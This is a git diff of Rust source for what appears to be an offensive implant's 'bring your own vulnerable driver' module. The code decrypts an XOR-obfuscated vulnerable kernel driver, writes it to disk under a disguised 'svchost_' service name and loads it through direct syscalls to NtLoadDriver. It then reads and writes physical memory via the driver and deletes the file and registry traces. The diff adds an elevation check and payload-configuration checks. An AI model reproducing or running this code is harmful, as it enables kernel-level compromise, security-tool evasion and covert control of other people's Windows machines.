@@ -99,6 +99,11 @@ fn make_unicode_string(wide: &mut [u16]) -> UnicodeStringNt {
     }
 }
 
+#[inline(always)]
+fn ntstatus_or_default(status: Result<i32>) -> i32 {
+    status.unwrap_or(-1)
+}
+
 // ── NT structures for NtQuerySystemInformation (SystemModuleInformation) ─
 
 #[repr(C)]
@@ -154,7 +159,7 @@ pub fn scan_for_loaded_driver(preferred: &[String]) -> Result<Option<&'static Vu
 
     // First call to get required buffer size.
     unsafe {
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtQuerySystemInformation",
             SYSTEM_MODULE_INFORMATION,
             base_addr as *mut u8,
@@ -173,15 +178,15 @@ pub fn scan_for_loaded_driver(preferred: &[String]) -> Result<Option<&'static Vu
     let mut buffer: Vec<u8> = vec![0u8; buf_size as usize + 4096];
     let mut return_length: u32 = 0;
 
-    let status = unsafe {
-        syscall!(
+    let status = ntstatus_or_default(unsafe {
+        crate::syscall!(
             "NtQuerySystemInformation",
             SYSTEM_MODULE_INFORMATION,
             buffer.as_mut_ptr(),
             buffer.len(),
             &mut return_length as *mut u32
         )
-    };
+    });
 
     if status != 0 {
         bail!(
@@ -268,8 +273,8 @@ pub fn deploy_embedded_driver(
     driver: &'static VulnerableDriver,
     session_key: &[u8],
 ) -> Result<DeployedDriver> {
-    // For now, we simulate the embedded resource with placeholder bytes.
-    // In production, this would be `include_bytes!` with actual driver binaries.
+    // Encrypted bytes must come from a real build-time embedded payload.
+    // Placeholder bytes are rejected by `get_embedded_driver_bytes`.
     let encrypted_bytes = get_embedded_driver_bytes(driver);
     if encrypted_bytes.is_empty() {
         bail!(
@@ -283,9 +288,11 @@ pub fn deploy_embedded_driver(
     let decrypted = xor_decrypt(&encrypted_bytes, &key);
 
     // Generate obfuscated temp filename.
+    let service_prefix_bytes = string_crypt::enc_str!("svchost_");
+    let service_prefix = String::from_utf8_lossy(&service_prefix_bytes);
     let service_name = format!(
         "{}{}",
-        string_crypt::enc_str!("svchost_"),
+        service_prefix.trim_end_matches('\0'),
         crate::common_short_id()
     );
     let temp_path = format!(
@@ -331,18 +338,19 @@ pub fn deploy_embedded_driver(
     Ok(guard.as_ref().unwrap().clone())
 }
 
-/// XOR-encrypted placeholder driver embedded at compile time.
+/// Build-time placeholder bytes.
 ///
-/// This is a minimal 4KB PE stub that will be replaced by the builder
-/// with the actual XOR-encrypted vulnerable driver binary.  The XOR key
-/// is derived at runtime via HKDF from the session key (see `derive_driver_key`).
+/// These bytes are intentionally treated as "not configured" and are never
+/// deployed as a real driver payload.
+static PLACEHOLDER_DRIVER_BYTES: &[u8] = include_bytes!("../../resources/placeholder_driver.xor");
+
+/// XOR-encrypted embedded driver bytes.
 ///
-/// Controlled by the `EMBEDDED_DRIVER` build-time flag.  When set to an
-/// actual driver path (by the builder), this resolves to the encrypted bytes.
-/// When unset (default), only the placeholder is included.
+/// With `embedded_driver` disabled, this resolves to the placeholder marker.
+/// With `embedded_driver` enabled, this resolves to the payload from
+/// `SYS_DRIVER_PATH`.
 #[cfg(not(feature = "embedded_driver"))]
-static EMBEDDED_DRIVER_BYTES: &[u8] =
-    include_bytes!("../../resources/placeholder_driver.xor");
+static EMBEDDED_DRIVER_BYTES: &[u8] = PLACEHOLDER_DRIVER_BYTES;
 
 /// When the `embedded_driver` feature is enabled, the builder MUST set the
 /// `SYS_DRIVER_PATH` environment variable at compile time to point to the
@@ -359,11 +367,15 @@ static EMBEDDED_DRIVER_BYTES: &[u8] =
 #[cfg(feature = "embedded_driver")]
 static EMBEDDED_DRIVER_BYTES: &[u8] = include_bytes!(env!("SYS_DRIVER_PATH"));
 
+#[inline]
+fn embedded_payload_is_configured() -> bool {
+    !EMBEDDED_DRIVER_BYTES.is_empty() && EMBEDDED_DRIVER_BYTES != PLACEHOLDER_DRIVER_BYTES
+}
+
 /// Get the embedded (XOR-encrypted) bytes for a driver.
 ///
 /// In production, the top 3 drivers are embedded via `include_bytes!` with
-/// XOR obfuscation applied at build time.  When the `embedded_driver` feature
-/// is not set, the placeholder bytes are returned (a minimal 4KB PE stub).
+/// XOR obfuscation applied at build time.
 fn get_embedded_driver_bytes(driver: &VulnerableDriver) -> Vec<u8> {
     // Only the top 3 (Tier 1) drivers have embedded resources.
     let embedded = driver_db::embedded_drivers();
@@ -377,9 +389,9 @@ fn get_embedded_driver_bytes(driver: &VulnerableDriver) -> Vec<u8> {
         return Vec::new();
     }
 
-    if EMBEDDED_DRIVER_BYTES.is_empty() {
+    if !embedded_payload_is_configured() {
         log::warn!(
-            "Embedded driver bytes are empty for {}. Set ORCHESTRA_DRIVER_PATH at build time.",
+            "Embedded driver payload is not configured for {}. Build with --features embedded_driver and set SYS_DRIVER_PATH.",
             driver.name
         );
         return Vec::new();
@@ -419,8 +431,8 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
     //   PVOID              EaBuffer,          // 10 — NULL
     //   ULONG              EaLength           // 11 — 0
     // )
-    let status = unsafe {
-        syscall!(
+    let status = ntstatus_or_default(unsafe {
+        crate::syscall!(
             "NtCreateFile",
             &mut handle as *mut usize as u64,       // 1
             0x40000000u64,                           // 2 — GENERIC_WRITE
@@ -434,7 +446,7 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
             0u64,                                    // 10 — EaBuffer
             0u64                                     // 11 — EaLength
         )
-    };
+    });
 
     if status != 0 {
         bail!("NtCreateFile for driver path failed: 0x{:08X}", status);
@@ -442,8 +454,8 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
 
     // Write the data via NtWriteFile.
     let mut write_iosb = IoStatusBlock::default();
-    let status = unsafe {
-        syscall!(
+    let status = ntstatus_or_default(unsafe {
+        crate::syscall!(
             "NtWriteFile",
             handle as u64,                           // FileHandle
             0u64,                                    // Event
@@ -455,10 +467,10 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
             std::ptr::null::<u64>() as u64,          // ByteOffset (NULL = current)
             0u64                                     // Key
         )
-    };
+    });
 
     // Close the file handle.
-    let _ = unsafe { syscall!("NtClose", handle as u64) };
+    let _ = unsafe { crate::syscall!("NtClose", handle as u64) };
 
     if status != 0 {
         bail!("NtWriteFile for driver failed: 0x{:08X}", status);
@@ -491,8 +503,8 @@ fn load_driver_via_registry(
 
     let mut disp: u32 = 0;
 
-    let status = unsafe {
-        syscall!(
+    let status = ntstatus_or_default(unsafe {
+        crate::syscall!(
             "NtCreateKey",
             &mut key_handle as *mut usize as u64,
             0x00020006u64, // KEY_WRITE | KEY_SET_VALUE | KEY_CREATE_SUB_KEY
@@ -502,7 +514,7 @@ fn load_driver_via_registry(
             1u64, // CreateOptions = REG_OPTION_VOLATILE
             &mut disp as *mut u32 as u64
         )
-    };
+    });
 
     if status != 0 {
         bail!("NtCreateKey for service entry failed: 0x{:08X}", status);
@@ -525,15 +537,15 @@ fn load_driver_via_registry(
     .collect();
     let mut load_uni = make_unicode_string(&mut load_path_wide);
 
-    let status = unsafe {
-        syscall!(
+    let status = ntstatus_or_default(unsafe {
+        crate::syscall!(
             "NtLoadDriver",
             &mut load_uni as *mut _ as u64
         )
-    };
+    });
 
     // Close the registry key.
-    let _ = unsafe { syscall!("NtClose", key_handle as u64) };
+    let _ = unsafe { crate::syscall!("NtClose", key_handle as u64) };
 
     if status != 0 {
         // Clean up the registry key on failure.
@@ -552,8 +564,8 @@ fn set_registry_dword(key_handle: usize, value_name: &str, value: u32) -> Result
     let mut name_wide: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();
     let mut uni_name = make_unicode_string(&mut name_wide);
 
-    let status = unsafe {
-        syscall!(
+    let status = ntstatus_or_default(unsafe {
+        crate::syscall!(
             "NtSetValueKey",
             key_handle as u64,
             &mut uni_name as *mut _ as u64,
@@ -562,7 +574,7 @@ fn set_registry_dword(key_handle: usize, value_name: &str, value: u32) -> Result
             &value as *const u32 as u64,
             4u64    // DataSize
         )
-    };
+    });
 
     if status != 0 {
         bail!(
@@ -582,8 +594,8 @@ fn set_registry_string(key_handle: usize, value_name: &str, value: &str) -> Resu
     let mut value_wide: Vec<u16> = value.encode_utf16().collect();
     let data_size = value_wide.len() as u64 * 2 + 2; // Include null terminator
 
-    let status = unsafe {
-        syscall!(
+    let status = ntstatus_or_default(unsafe {
+        crate::syscall!(
             "NtSetValueKey",
             key_handle as u64,
             &mut uni_name as *mut _ as u64,
@@ -592,7 +604,7 @@ fn set_registry_string(key_handle: usize, value_name: &str, value: &str) -> Resu
             value_wide.as_mut_ptr() as u64,
             data_size
         )
-    };
+    });
 
     if status != 0 {
         bail!(
@@ -614,15 +626,15 @@ fn delete_registry_key(path: &str) {
     let mut key_handle: usize = 0;
 
     unsafe {
-        let status = syscall!(
+        let status = ntstatus_or_default(crate::syscall!(
             "NtOpenKey",
             &mut key_handle as *mut usize as u64,
             0x00020019u64, // KEY_WRITE | DELETE
             &mut oa as *mut _ as u64
-        );
+        ));
         if status == 0 {
-            let _ = syscall!("NtDeleteKey", key_handle as u64);
-            let _ = syscall!("NtClose", key_handle as u64);
+            let _ = crate::syscall!("NtDeleteKey", key_handle as u64);
+            let _ = crate::syscall!("NtClose", key_handle as u64);
         }
     }
 }
@@ -639,12 +651,12 @@ fn delete_file_from_disk(path: &str) -> Result<()> {
     let mut uni_name = make_unicode_string(&mut wide_path);
     let mut oa = ObjectAttributes::new(&mut uni_name);
 
-    let status = unsafe {
-        syscall!(
+    let status = ntstatus_or_default(unsafe {
+        crate::syscall!(
             "NtDeleteFile",
             &mut oa as *mut _ as u64
         )
-    };
+    });
 
     if status != 0 {
         // Non-fatal: the driver is already loaded in kernel memory.
@@ -670,8 +682,8 @@ fn open_driver_device(driver: &VulnerableDriver) -> Result<usize> {
 
     let mut handle: usize = 0;
 
-    let status = unsafe {
-        syscall!(
+    let status = ntstatus_or_default(unsafe {
+        crate::syscall!(
             "NtOpenFile",
             &mut handle as *mut usize as u64,
             (0x00100000u64 | 0x00020000u64), // SYNCHRONIZE | FILE_READ_DATA
@@ -680,7 +692,7 @@ fn open_driver_device(driver: &VulnerableDriver) -> Result<usize> {
             0x20u64, // FILE_SYNCHRONOUS_IO_NONALERT
             0u64     // ShareAccess
         )
-    };
+    });
 
     if status != 0 {
         bail!(
@@ -724,7 +736,7 @@ pub unsafe fn read_physical_memory(
             //   PVOID           OutputBuffer,     // 9
             //   ULONG           OutputBufferLength// 10
             // )
-            let status = syscall!(
+            let status = ntstatus_or_default(crate::syscall!(
                 "NtDeviceIoControlFile",
                 device_handle as u64,                      // 1
                 0u64,                                      // 2 — Event
@@ -736,7 +748,7 @@ pub unsafe fn read_physical_memory(
                 input.len() as u64,                        // 8
                 buffer.as_mut_ptr() as u64,                // 9
                 buffer.len() as u64                        // 10
-            );
+            ));
 
             if status != 0 {
                 bail!(
@@ -777,7 +789,7 @@ pub unsafe fn write_physical_memory(
 
             let mut iosb = IoStatusBlock::default();
 
-            let status = syscall!(
+            let status = ntstatus_or_default(crate::syscall!(
                 "NtDeviceIoControlFile",
                 device_handle as u64,                      // 1
                 0u64,                                      // 2 — Event
@@ -789,7 +801,7 @@ pub unsafe fn write_physical_memory(
                 input.len() as u64,                        // 8
                 0u64,                                      // 9 — OutputBuffer
                 0u64                                       // 10 — OutputLength
-            );
+            ));
 
             if status != 0 {
                 bail!(
@@ -818,7 +830,7 @@ pub unsafe fn cleanup_driver() -> Result<()> {
     if let Some(deployed) = guard.take() {
         // Close device handle.
         if let Some(handle) = deployed.device_handle {
-            let _ = syscall!("NtClose", handle as u64);
+            let _ = crate::syscall!("NtClose", handle as u64);
         }
 
         // Delete the registry service entry.
@@ -845,12 +857,83 @@ pub fn get_deployed_driver() -> Option<DeployedDriver> {
     guard.as_ref().map(|d| d.clone())
 }
 
+/// Check whether the current process is running with elevated (Administrator)
+/// privileges by querying the process token for elevation status.
+///
+/// Uses `NtOpenProcessToken` + `NtQueryInformationToken(TokenElevation)`.
+/// Returns `true` if the token is elevated, `false` otherwise.
+fn is_process_elevated() -> bool {
+    // TokenElevation information class = 20
+    const TOKEN_ELEVATION_CLASS: u32 = 20;
+    // TOKEN_QUERY access right
+    const TOKEN_QUERY: u32 = 0x0008;
+    // CurrentProcess pseudo-handle = (HANDLE)-1
+    const CURRENT_PROCESS: usize = usize::MAX;
+
+    let mut token_handle: usize = 0;
+
+    // Open the current process token.
+    let status = ntstatus_or_default(unsafe {
+        crate::syscall!(
+            "NtOpenProcessToken",
+            CURRENT_PROCESS as u64,
+            TOKEN_QUERY as u64,
+            &mut token_handle as *mut usize as u64
+        )
+    });
+
+    if status != 0 {
+        log::warn!(
+            "is_process_elevated: NtOpenProcessToken failed (0x{:08X}) — assuming not elevated",
+            status
+        );
+        return false;
+    }
+
+    // TOKEN_ELEVATION struct: a single DWORD (0 = not elevated, 1 = elevated).
+    let mut elevation: u32 = 0;
+    let mut return_length: u32 = 0;
+
+    let status = ntstatus_or_default(unsafe {
+        crate::syscall!(
+            "NtQueryInformationToken",
+            token_handle as u64,
+            TOKEN_ELEVATION_CLASS as u64,
+            &mut elevation as *mut u32 as u64,
+            std::mem::size_of::<u32>() as u64,
+            &mut return_length as *mut u32 as u64
+        )
+    });
+
+    // Close the token handle.
+    let _ = unsafe { crate::syscall!("NtClose", token_handle as u64) };
+
+    if status != 0 {
+        log::warn!(
+            "is_process_elevated: NtQueryInformationToken failed (0x{:08X}) — assuming not elevated",
+            status
+        );
+        return false;
+    }
+
+    elevation != 0
+}
+
 /// Main deployment orchestrator: try pre-loaded drivers, then embedded.
 ///
 /// # Arguments
 /// * `preferred` - Optional list of driver names to try (empty = try all)
 /// * `session_key` - HKDF session key for driver resource decryption
 pub fn deploy(preferred: &[String], session_key: &[u8]) -> Result<DeployedDriver> {
+    // Pre-flight: driver loading requires elevated (Administrator) privileges.
+    // Bail early rather than fail cryptically at NtLoadDriver.
+    if !is_process_elevated() {
+        bail!(
+            "Cannot deploy kernel driver: process is not elevated. \
+             NtLoadDriver requires Administrator / SYSTEM privileges."
+        );
+    }
+
     // Step 1: Try to find an already-loaded vulnerable driver.
     if let Some(driver) = scan_for_loaded_driver(preferred)? {
         // Driver is already loaded — just need a device handle.
@@ -880,9 +963,15 @@ pub fn deploy(preferred: &[String], session_key: &[u8]) -> Result<DeployedDriver
         return Ok(guard.as_ref().unwrap().clone());
     }
 
-    // Step 2: Try embedded drivers.
     let embedded = driver_db::embedded_drivers();
-    for driver in embedded {
+    if !embedded_payload_is_configured() {
+        bail!(
+            "No vulnerable driver could be deployed: no pre-loaded driver found and embedded payload wiring is not configured (placeholder resource active). Build with --features embedded_driver and set SYS_DRIVER_PATH."
+        );
+    }
+
+    // Step 2: Try embedded drivers.
+    for &driver in &embedded {
         // Skip if not in preferred list (when specified).
         if !preferred.is_empty() {
             let name_match = preferred
